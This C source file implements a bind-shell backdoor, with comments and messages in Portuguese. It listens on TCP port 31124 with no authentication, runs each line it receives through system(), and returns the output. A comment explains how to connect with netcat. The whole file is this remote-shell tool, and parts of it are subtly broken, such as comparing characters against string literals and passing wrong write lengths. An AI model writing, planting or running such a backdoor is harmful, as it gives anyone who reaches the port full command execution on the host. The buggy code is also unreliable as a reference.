#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h> 
#define MINHAPORTA 31124    
#define BACKLOG 10       

//para conectar com netcat nc -v ip_aqui 31124

int main(){

    int Meusocket, Novosocket;         
    struct sockaddr_in meu_endereco;    
    struct sockaddr_in endereco_dele;   
    int tamanho;
    int escritor;
    int i,backup,p[2];
    char frase[1024],buf[1024];
    if ((Meusocket = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        printf("[-] Error Socket\n");
        perror("socket");
        exit(1);
    }
    meu_endereco.sin_family = AF_INET;          
    meu_endereco.sin_port = htons(MINHAPORTA);  
    meu_endereco.sin_addr.s_addr = INADDR_ANY;   
    bzero(&(meu_endereco.sin_zero), 8);         
    if (bind(Meusocket, (struct sockaddr *)&meu_endereco, sizeof(struct sockaddr))== -1){
        printf("[-] Error Bind\n");
        perror("bind");
        exit(1);
    }
    if (listen(Meusocket, BACKLOG) < 0){
        printf("[-] Error listen\n");
        perror("listen");
        exit(1);
    }
    tamanho = sizeof(struct sockaddr_in);
    printf("[+] Aguardando Conexao...\n");
    while(Novosocket = accept(Meusocket, (struct sockaddr *)&endereco_dele,&tamanho)){
        printf("[+] Conectado\n"); 
        escritor = write (Novosocket, (void *) "[+] Conectado\n=> ", 27); 
        while(escritor = read (Novosocket, (char *) frase, 1024)){
            i = strlen(frase) - 1;      
            if (frase[i] == "\n"){      
                frase[i] = "";    
                if (strncmp(frase, "cd ", 2) == 0){ 
                    printf("[+] Chdir para %s\n",frase + 3);
                    chdir(frase + 3);
                }else if(strcmp(frase,"/sair") == 0){ 
                    escritor = write (Novosocket, (void *) "\n[+] Fechando Conexao\n", 20);
                    close(Novosocket);
                    close(Meusocket);
                    printf ("[+] Conexao fechada\n");
                    exit(0);
                }else{
                    backup = dup(1);
                    close(0);
                    close(1);


                    pipe(p);
                    system(frase);
                    dup2(backup,1);
                    while (fgets(buf, 1024, stdin)){
                        escritor = write (Novosocket, (void *) buf, strlen(buf));
                    }
                }
                escritor = write (Novosocket, (void *) "\n=> ", 5);
            }
            memset(&frase, 0, sizeof (frase) );
        }
    }
}

